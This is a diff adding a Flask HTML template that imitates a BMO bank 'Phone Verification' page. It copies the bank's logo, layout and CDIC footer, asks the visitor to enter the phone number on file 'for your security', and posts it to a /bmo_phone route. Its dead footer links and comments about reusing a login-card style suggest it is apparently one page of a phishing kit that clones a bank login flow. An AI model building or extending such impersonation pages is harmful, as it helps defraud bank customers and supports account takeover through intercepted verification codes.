@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>BMO Phone Verification</title>
+  <!-- Link to your existing bmo.css -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='bmo.css') }}">
+</head>
+<body>
+
+<!-- TOP BLUE BAR -->
+<header class="bmo-topbar">
+  <div class="bmo-topbar-container">
+    <div class="bmo-logo-container">
+      <img src="/static/images/bmo-logo.png" alt="BMO Logo" class="bmo-logo">
+    </div>
+    <div class="bmo-topbar-icons">
+      <img src="/static/images/location-icon.png" alt="Location" class="top-icon">
+      <img src="/static/images/help-icon.png" alt="Help" class="top-icon">
+      <a href="#" class="fr-link">FR</a>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+<main class="bmo-main">
+
+  <!-- Page Title (centered or left as you prefer) -->
+  <div class="bmo-page-title-row">
+    <h1 class="bmo-title">
+      <!-- Optional lock icon if you like:
+      <img src="/static/images/lock-icon.png" alt="Lock" class="lock-icon">
+      -->
+      Phone Verification
+    </h1>
+  </div>
+
+  <!-- A single white card for phone verification -->
+  <div class="bmo-content" style="justify-content: center;">
+    <!-- You can reuse .bmo-login-card styling for a consistent look -->
+    <div class="bmo-login-card" style="max-width: 500px;">
+      <p>
+        For your security, we need to verify the phone number on file. Please
+        enter your number below and click “Send Code” to proceed.
+      </p>
+
+      <!-- CHANGED HERE: action="/bmo_phone" instead of "/bmo-phone-verify-submit" -->
+      <form action="/bmo_phone" method="POST" style="margin-top: 20px;">
+        <div class="bmo-input-group">
+          <label for="phoneNumber">Phone number</label>
+          <input
+            type="tel"
+            id="phoneNumber"
+            name="phone_number"
+            class="bmo-input large-input"
+            placeholder="(###) ###-####"
+            required
+          >
+          <p class="field-hint">e.g. (555) 123-4567</p>
+        </div>
+
+        <button type="submit" class="bmo-btn" style="margin-top: 10px;">
+          SEND CODE
+        </button>
+      </form>
+    </div>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer class="bmo-footer">
+  <ul class="footer-links">
+    <li><a href="#">Legal</a></li>
+    <li><a href="#">Privacy</a></li>
+    <li><a href="#">Security</a></li>
+    <li><a href="#">Accessibility</a></li>
+  </ul>
+  <div class="footer-members">
+    <a href="#">CDIC Member</a>
+  </div>
+</footer>
+
+</body>
+</html>
